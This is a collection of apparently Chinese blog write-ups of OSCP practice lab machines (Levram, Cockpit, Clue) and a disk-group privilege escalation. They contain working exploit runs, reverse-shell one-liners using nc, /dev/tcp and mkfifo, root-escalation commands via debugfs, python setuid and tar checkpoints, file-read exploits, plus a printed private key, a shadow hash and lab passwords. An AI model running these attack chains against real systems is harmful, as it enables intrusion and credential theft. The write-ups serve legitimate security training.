diskbrw-rw---- 1 root disk 253, 0 Aug 3 2024 dm-0brw-rw---- 1 root disk 8, 0 Aug 3 2024 sdabrw-rw---- 1 root disk 8, 1 Aug 3 2024 sda1brw-rw---- 1 root disk 8, 2 Aug 3 2024 sda2brw-rw---- 1 root disk 8, 3 Aug 3 2024 sda3...$ find /dev -group disk/dev/btrfs-control/dev/dm-0/dev/sda3/dev/sda2/dev/sda1/dev/sda/dev/sg1/dev/loop7/dev/loop6/dev/loop5/dev/loop4/dev/loop3/dev/loop2/dev/loop1/dev/loop0/dev/loop-control 查看所有分区 123456789101112131415$ df -hFilesystem Size Used Avail Use% Mounted onudev 947M 0 947M 0% /devtmpfs 199M 1.2M 198M 1% /run/dev/dm-0 9.8G 5.1G 4.2G 55% /tmpfs 992M 0 992M 0% /dev/shmtmpfs 5.0M 0 5.0M 0% /run/locktmpfs 992M 0 992M 0% /sys/fs/cgroup/dev/loop0 62M 62M 0 100% /snap/core20/1611/dev/loop2 50M 50M 0 100% /snap/snapd/18596/dev/loop1 64M 64M 0 100% /snap/core20/1852/dev/loop3 92M 92M 0 100% /snap/lxd/24061/dev/loop4 68M 68M 0 100% /snap/lxd/22753/dev/sda2 1.7G 209M 1.4G 13% /boottmpfs 199M 0 199M 0% /run/user/1000 Exploit确认用户所属disk group之后，可以使用debugfs来枚举整个磁盘数据以获取root级权限，因为我们还拥有对磁盘块文件完全的读写访问权限，可以写入任意文件，换言之，有了disk group，实际上我们就是root，只不过是以一种迂回的方式。 1234567891011121314$ debugfs /dev/dm-0debugfs 1.45.5 (07-Jan-2020)debugfs: lsdebugfs: cd /rootdebugfs: cat proof.txt492fe994bfe90fd82258b4d6d1118374debugfs: cat .profile# ~/.profile: executed by Bourne-compatible login shells.if [ &quot;$BASH&quot; ]; then if [ -f ~/.bashrc ]; then . ~/.bashrc fifi 写authorized_keys, 写&#x2F;etc&#x2F;passwd …… 1debugfs: cp id_rsa.pub /root/.ssh/authorized_keys 读root公私钥、读&#x2F;etc&#x2F;shadow, hashcat爆破root密码 ….. 12debugfs: cat /etc/shadowroot:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: 1hashcat -m 1800 root.hash","categories":[{"name":"How It Works-临渊羡鱼","slug":"How-It-Works-临渊羡鱼","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/"},{"name":"linux提权","slug":"How-It-Works-临渊羡鱼/linux提权","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/linux%E6%8F%90%E6%9D%83/"}],"tags":[]},{"title":"Proving Grounds Practice - Levram","date":"2025-02-15T14:52:33.000Z","path":"post/20250215225233.html","text":"Difficulty： easyscans12345678[*] ssh found on tcp/22. OpenSSH 8.9p1[*] http-alt found on tcp/8000. WSGIServer/0.2 CPython/3.10.6 SilverStream Title: Gerapy foothold8000 gerapy 弱密码admin:admin登录 底部发现版本号 seachspolitsearchsploit gerapy 完全符合，执行后报错，查看利用代码，获取projects时返回数据为空, 新建一个test project,重新执行，成功反弹shell 123456789101112131415161718192021python 50640.py -t 192.168.212.24 -p 8000 -L 192.168.45.184 -P 80 ______ _______ ____ ___ ____ _ _ _ _____ ___ ____ _____ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\/ | | || ||___ / ( _ ) ___|___ || | \\ \\ / /| _| _____ __) | | | |__) | |_____| || |_ |_ \\ / _ \\___ \\ / /| |___ \\ V / | |__|_____/ __/| |_| / __/| |_____|__ _|__) | (_) |__) |/ / \\____| \\_/ |_____| |_____|\\___/_____|_| |_||____/ \\___/____//_/Exploit for CVE-2021-43857For: Gerapy &lt; 0.9.8[*] Resolving URL...[*] Logging in to application...[*] Login successful! Proceeding...[*] Getting the project listTraceback (most recent call last): File &quot;/home/kali/Tools/pg/Levarm/50640.py&quot;, line 130, in &lt;module&gt; exp.exploitation() File &quot;/home/kali/Tools/pg/Levarm/50640.py&quot;, line 76, in exploitation name = dict3[0][&#x27;name&#x27;] ~~~~~^^^IndexError: list index out of range 123456789101112131415161718192021222324252627python 50640.py -t 192.168.212.24 -p 8000 -L 192.168.45.184 -P 80 ______ _______ ____ ___ ____ _ _ _ _____ ___ ____ _____ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\/ | | || ||___ / ( _ ) ___|___ || | \\ \\ / /| _| _____ __) | | | |__) | |_____| || |_ |_ \\ / _ \\___ \\ / /| |___ \\ V / | |__|_____/ __/| |_| / __/| |_____|__ _|__) | (_) |__) |/ / \\____| \\_/ |_____| |_____|\\___/_____|_| |_||____/ \\___/____//_/Exploit for CVE-2021-43857For: Gerapy &lt; 0.9.8[*] Resolving URL...[*] Logging in to application...[*] Login successful! Proceeding...[*] Getting the project list[*] Found project: test[*] Getting the ID of the project to build the URL[*] Found ID of the project: 1[*] Setting up a netcat listenerlistening on [any] 80 ...[*] Executing reverse shell payload[*] Watchout for shell! :)connect to [192.168.45.184] from (UNKNOWN) [192.168.212.24] 44652bash: cannot set terminal process group (846): Inappropriate ioctl for devicebash: no job control in this shellapp@ubuntu:~/gerapy$ ididuid=1000(app) gid=1000(app) groups=1000(app) escalation下载linpeas, 发现python3 cap_setuid 权限， 执行 python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;提权 https://gtfobins.github.io/gtfobins/python/ 123python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;# iduid=0(root) gid=1000(app) groups=1000(app)","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Cockpit","date":"2025-02-14T18:26:57.000Z","path":"post/20250215022657.html","text":"scansautorecon info1234567891011121314151617181920212223- OS Ubuntu 20.04.6 LTS- ports- 22 openSSH 8.2- 80 Apache 2.4.41 Title: blaze http://192.168.166.10/img/ http://192.168.166.10/blocked.html http://192.168.166.10/login.php http://192.168.166.10/db_config.php- 9090 version 2.1.4 OpenSSL 3.3.2.3 ssl/zeus-admin?- things to try - apache 2.4.41 - 80 admin - 9090 zeus-admin - blaze username - cockpit 22 openssh 8.2没有已知漏洞 80 blaze登录192.168.166.10 弱密码admin:admin&#x2F;123456&#x2F;password&#x2F;abc123 都不正确 9090 cockpit192.168.166.10:9090 弱密码登录无效 查看源码cms: cockpit searchsploit cockpit 已知漏洞，利用不成功，搜索cockpit exploit也没有收货 foothold查看hits, blaze存在sql注入漏洞，admin’ – 登录后得到用户和base64编码的密码 解码后得到 12345jamescanttouchhhthiss@455152cameronthisscanttbetouchedd@455152 使用james和密码ssh登录，发现只支持使用公私钥验证 12ssh james@192.168.166.10james@192.168.166.10: Permission denied (publickey). 9090使用james登录，在账户里发现可以上传公钥 1234ssh james@192.168.166.10whoamijames escalation检查进程、定时任务等没有收获，sudo -l 发现可以执行tar命令， https://gtfobins.github.io/gtfobins/tar/直接提权root 1234567891011121314151617181920212223242526272829303132333435sudo -lMatching Defaults entries for james on blaze: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on blaze: (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz * sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/shapt-changelog-ZA6iyM/snap-private-tmp/snap-private-tmp/snap.lxd/snap-private-tmp/snap.lxd/tmp/ssh-6KkSqBBpG1eF//usr/bin/tar: ssh-6KkSqBBpG1eF/agent.131828: socket ignoredsystemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-43mHFi/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-43mHFi/tmp/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/tmp/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/tmp/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/tmp/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/tmp/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-65G4Yi/systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-65G4Yi/tmp/tmp.es7Hxs9VMbtmp.eXjbihXM2Ntmp.gvPWK74jcw# iduid=0(root) gid=0(root) groups=0(root)# whoamiroot 反思 最近刷lab都是使用已知漏洞，最应该尝试的sql注入都没有测试 发现无法利用的exploit 不要死磕？oscp不会考需要修改很多才能利用的题目？","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Clue","date":"2025-02-14T15:19:37.000Z","path":"post/20250214231937.html","text":"scanautorecon 12345678910111213141516171819202122232425262728293031323334353637383940414243- osDebian LinuxOS: Linux/Unix (Samba 4.9.5-Debian)OS version: &#x27;6.1&#x27;OS release: &#x27;&#x27;OS build: &#x27;0&#x27;Native OS: Windows 6.1Native LAN manager: Samba 4.9.5-DebianPlatform id: &#x27;500&#x27;Server type: &#x27;0x809a03&#x27;- ports- 22 openssh 7.9p1- 80 apache 2.4.38 首页403 扫到/backup文件夹- 139- 445 SMB 3.0 freeswitch cassandra csmb: \\freeswitch\\usr\\&gt; cd bin smb: \\freeswitch\\usr\\bin\\&gt; ls . D 0 Mon Oct 25 01:26:29 2021 .. D 0 Mon Oct 25 01:26:29 2021 tone2wav N 14512 Mon Oct 25 01:26:29 2021 fs_ivrd N 68320 Mon Oct 25 01:26:29 2021 fs_cli N 98624 Mon Oct 25 01:26:29 2021 ...- 3000 vary:oprigin Cassandra web 存在backup/cert footholdsmb匿名登录发现freeswitch和cassandra文件夹 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Fri Aug 5 16:43:50 2022 .. D 0 Fri Aug 5 16:43:44 2022 freeswitch D 0 Fri Aug 5 16:43:51 2022 cassandra D 0 Fri May 6 23:04:47 2022 14343176 blocks of size 1024. 10599324 blocks availablesmb: \\&gt; cd freeswitch\\smb: \\freeswitch\\&gt; ls . D 0 Fri Aug 5 16:43:51 2022 .. D 0 Fri Aug 5 16:43:50 2022 usr D 0 Mon Oct 25 01:26:29 2021 var D 0 Mon Oct 25 01:26:29 2021 etc D 0 Fri Aug 5 16:43:51 2022 14343176 blocks of size 1024. 10599324 blocks availablesmb: \\freeswitch\\&gt; cat /etc/cat: command not foundsmb: \\freeswitch\\&gt; ls . D 0 Fri Aug 5 16:43:51 2022 .. D 0 Fri Aug 5 16:43:50 2022 usr D 0 Mon Oct 25 01:26:29 2021 var D 0 Mon Oct 25 01:26:29 2021 etc D 0 Fri Aug 5 16:43:51 2022 14343176 blocks of size 1024. 10599324 blocks availablesmb: \\freeswitch\\&gt; cd etc\\smb: \\freeswitch\\etc\\&gt; ls . D 0 Fri Aug 5 16:43:51 2022 .. D 0 Fri Aug 5 16:43:51 2022 freeswitch D 0 Mon Oct 25 01:23:57 2021 14343176 blocks of size 1024. 10599324 blocks availablesmb: \\freeswitch\\etc\\&gt; cd freeswitch\\smb: \\freeswitch\\etc\\freeswitch\\&gt; ls . D 0 Mon Oct 25 01:23:57 2021 .. D 0 Fri Aug 5 16:43:51 2022 vars.xml N 19463 Mon Oct 25 01:23:57 2021 tetris.ttml N 1157 Mon Oct 25 01:23:57 2021 ... smb: \\&gt; cd cassandra\\smb: \\cassandra\\&gt; ls . D 0 Fri May 6 23:04:47 2022 .. D 0 Fri Aug 5 16:43:50 2022 usr D 0 Fri May 6 23:04:47 2022 var D 0 Fri May 6 23:04:47 2022 etc D 0 Fri May 6 23:04:47 2022 14343176 blocks of size 1024. 10599320 blocks availablesmb: \\cassandra\\&gt; freeswitch经过搜索 freeswitch存在RCE漏洞 执行payload提示 auth invalid 从github有下载了exploit payload一样提示auth faild http://github.com:Chocapikk/CVE-2019-19492.git 12345python exploit.py --target 192.168.166.240b&#x27;Content-Type: command/reply\\nReply-Text: -ERR invalid\\n\\nContent-Type: text/disconnect-notice\\nContent-Length: 67\\n\\nDisconnected, goodbye.\\nSee you at ClueCon! http://www.cluecon.com/\\n&#x27;Authentication failed - 192.168.166.240:8021Not vulnerable 利用代码中password是默认密码ClueCon 123ADDRESS=sys.argv[1]CMD=sys.argv[2]PASSWORD=&#x27;ClueCon&#x27; # default password for FreeSWITCH cassandracassandra 存在任意文件读取漏洞 读取&#x2F;etc&#x2F;passwd发现三个用户 root&#x2F;cassie&#x2F;anthony 1234567891011121314151617181920212223242526272829303132python 49362.py 192.168.166.240 /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinntp:x:106:113::/nonexistent:/usr/sbin/nologincassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologincassie:x:1000:1000::/home/cassie:/bin/bashfreeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/falseanthony:x:1001:1001::/home/anthony:/bin/bash 第一想法是是否可以读取某个用户的私钥信息，但是发现都读不到，唯一可以读取到的就是cassie&#x2F;.ssh&#x2F;known_hosts 123456789101112python 49362.py 192.168.166.240 /home/cassie/.ssh/id_rsaFailed to read /home/cassie/.ssh/id_rsa (bad path?)python 49362.py 192.168.166.240 /home/anthony/.ssh/id_rsaFailed to read /home/anthony/.ssh/id_rsa (bad path?)python 49362.py 192.168.166.240 /root/.ssh/id_rsaFailed to read /root/.ssh/id_rsa (bad path?)python 49362.py 192.168.166.240 /home/cassie/.ssh/known_hosts|1|cl0mW7klh2+eUO1GAszDa6SDpRI=|jSUa2FlglH9H3qUYQbfvLix8ino= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= 然后想到可以试下读取freeswitch的密码，搜索默认密码的存储位置是&#x2F;usr&#x2F;local&#x2F;freeswitch&#x2F;conf&#x2F;autoload_configs&#x2F;xml_rpc.conf.xml， 但是仍没有读到信息 12python 49362.py 192.168.166.240 /usr/local/freeswitch/conf/autoload_configs/xml_rpc.conf.xmlFailed to read /usr/local/freeswitch/conf/autoload_configs/xml_rpc.conf.xml (bad path?) 然后又尝试读crontab等其他文件，没有什么可以利用的方式。看一下当前进程，但是当时账号和密码被我忽略了，没有细看，只扫到执行了cassandra-web命令 123python 49362.py 192.168.166.240 /proc/self/cmdline/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330 单纯文件读取无法执行命令，读不到敏感信息，没法拿下机器，还是需要寄希望于freeswtich 命令执行漏洞。 再检查了一遍backup文件夹，看是不是能找到有用的信息，是不是可能有密码，使用smbclient一个个检查效率太低, 直接把远程smb挂载到本地 1sudo mount.cifs //192.168.166.240/backup ./backup -o guest 在vscode中打开，搜索pass, 找到密码确实是ClueCon, 然后我测试了所有搜索pass找到的疑似的密码，全部都invalid。 File Read &amp; Cmd Execute后来突然想到，在任意文件读取的时候不知道有哪些文件，所以没法找到有效信息，backup里就有文件的路径。 12345678910python 49362.py 192.168.166.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml&lt;configuration name=&quot;event_socket.conf&quot; description=&quot;Socket Client&quot;&gt; &lt;settings&gt; &lt;param name=&quot;nat-map&quot; value=&quot;false&quot;/&gt; &lt;param name=&quot;listen-ip&quot; value=&quot;0.0.0.0&quot;/&gt; &lt;param name=&quot;listen-port&quot; value=&quot;8021&quot;/&gt; &lt;param name=&quot;password&quot; value=&quot;StrongClueConEight021&quot;/&gt; &lt;/settings&gt;&lt;/configuration&gt; 果然读到了服务器上的密码 123456789101112131415161718192021222324python exploit.py --target 192.168.166.240StrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Command executed successfully - 192.168.166.240VULNERABLE USER: freeswitch# idStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 63uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)# whoamiStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 11freeswitch 本地nc -nvlp 443， 反弹shell, 试了nc, busybox nc , python, bash -i &#x2F;tcp&#x2F;port 都不成功，并且确认网络是能ping通的 1234567891011121314151617181920212223242526272829303132333435# which nc/usr/bin/nc# nc 192.168.45.229 443 -e /bin/bashError: timed out## /usr/bin/nc 192.168.45.184 443 -e /bin/bashError: timed out# sh -i &gt;&amp; /dev/tcp/192.168.45.184/443 0&gt;&amp;1-ERR no reply# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.45.184 443 &gt;/tmp/fError: timed out# busybox nc 192.168.45.184 443 -e shError: timed out# which python/usr/bin/python# python -c &#x27;import pty; pty.spwan(&quot;bin/bash&quot;)&#x27;-ERR no reply# ping 192.168.166.240 -c 1StrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 275PING 192.168.166.240 (192.168.166.240) 56(84) bytes of data.64 bytes from 192.168.166.240: icmp_seq=1 ttl=64 time=0.017 ms--- 192.168.166.240 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms 到&#x2F;home下看下两个目录下都有什么文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# ls -al /home/cassieStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 495total 32drwxr-xr-x 4 cassie cassie 4096 Aug 11 2022 .drwxr-xr-x 4 root root 4096 Aug 5 2022 ..lrwxrwxrwx 1 root root 9 Aug 5 2022 .bash_history -&gt; /dev/null-rw-r--r-- 1 cassie cassie 220 Apr 18 2019 .bash_logout-rw-r--r-- 1 cassie cassie 3526 Apr 18 2019 .bashrcdrwx------ 3 cassie cassie 4096 Aug 11 2022 .gnupg-rw------- 1 cassie cassie 1823 Aug 11 2022 id_rsa-rw-r--r-- 1 cassie cassie 807 Apr 18 2019 .profiledrwx------ 2 cassie cassie 4096 Aug 11 2022 .ssh# cat /home/cassie/id_rsaStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 14-ERR no reply# ls -al /home/anthoyStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 14-ERR no reply# cat /home/anthony/.bash_historyStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 14-ERR no reply# ls -al /home/anthonyStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 392total 28drwxr-xr-x 3 anthony anthony 4096 Aug 5 2022 .drwxr-xr-x 4 root root 4096 Aug 5 2022 ..-rw------- 1 anthony anthony 120 Aug 5 2022 .bash_history-rw-r--r-- 1 anthony anthony 220 Apr 18 2019 .bash_logout-rw-r--r-- 1 anthony anthony 3526 Apr 18 2019 .bashrc-rw-r--r-- 1 anthony anthony 807 Apr 18 2019 .profiledrwx------ 2 anthony anthony 4096 Aug 5 2022 .ssh# cat /home/anthony/.bash_historyStrongClueConEight021b&#x27;Content-Type: auth/request\\n\\n&#x27;Authenticated - 192.168.166.240:8021Content-Type: api/responseContent-Length: 14-ERR no reply &#x2F;home&#x2F;cassie下有个私钥文件，直接读取没有任何返回，应该freeswitch没有权限 使用cassandra 任意文件读取漏洞读取到私钥文件，修改私钥权限600, ssh &#x63;&#97;&#115;&#115;&#x61;&#x6e;&#100;&#x72;&#x61;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x31;&#x36;&#x36;&#46;&#50;&#x34;&#x30; -i id_rsa提示错误error in libcrypto 123456789101112131415161718192021222324252627282930313233343536python 49362.py 192.168.166.240 /home/cassie/id_rsa &gt; cassie_id_rsacat cassie_id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJed19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdMjWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2mB6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhqgBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9racIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XEQIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBwsmv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshPHUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9YetSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6MmGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+iCbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fGY2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2CgX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCGkrIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9byyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/YskBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvUDEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknNQ2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTUiw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==-----END OPENSSH PRIVATE KEY-----ssh cassie@192.168.166.240 -i cassie_id_rsaLoad key &quot;cassie_id_rsa&quot;: error in libcryptocassie@192.168.166.240&#x27;s password: 搜索一番后，是因为直接下载的私钥文件存在换行符不正确的问题（\\r\\n）， 在vscode中打开点击右下角的LF，更改成CRLF，重新登录，发现还是提示输入密码，然后又尝试了使用anthony账号也不正确 1234567ssh cassie@192.168.166.240 -i ~/id_rsacassie@192.168.166.240&#x27;s password:Permission denied, please try again.cassie@192.168.166.240&#x27;s password:ssh anthony@192.168.166.240 -i ~/id_rsaanthony@192.168.166.240&#x27;s password: 难道是root的私钥文件，竟然登录成功了 12345678910ssh root@192.168.166.240 -i ~/id_rsaThe programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.iduid=0(root) gid=0(root) groups=0(root) 官方walk through msf 获取到shell 在获取到freeswitch shell后，使用cassie：SecondBiteTheApple330切换到cassie账号（sshd_config限制了只有root和anthony能ssh登录），发现cassie可以不使用密码执行sudo cassandra-web， 使用root账号可以读取系统上所有文件 12345678freeswitch@clue:/$ su - cassiePassword: SecondBiteTheApple330cassie@clue:~$ sudo -lMatching Defaults entries for cassie on clue: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser cassie may run the following commands on clue: (ALL) NOPASSWD: /usr/local/bin/cassandra-web 通过444端口查看&#x2F;home&#x2F;anthony&#x2F;.bash_history 文件， anthony生成了密钥对，然后把公钥复制到root&#x2F;.ssh&#x2F;authorized_keys文件 1234567cassie@clue:~$ curl localhost:444/../../../../../../../../home/anthony/.bash_history --path-as-isclearls -lassh-keygencp .ssh/id_rsa.pub .ssh/authorized_keyssudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keysexit 下载私钥文件，ssh &#x72;&#111;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49; -i id_rsa, 根据这一步怀疑是官方忘记清理&#x2F;home&#x2F;cassie&#x2F;id_rsa了，我才能直接读取后登录root. 1234567891011121314cassie@clue:~$ curl localhost:444/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is -o id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1823 100 1823 0 0 178k 0 --:--:-- --:--:-- --:--:-- 197kcassie@clue:~$ chmod 600 id_rsacassie@clue:~$ ls -l id_rsa-rw------- 1 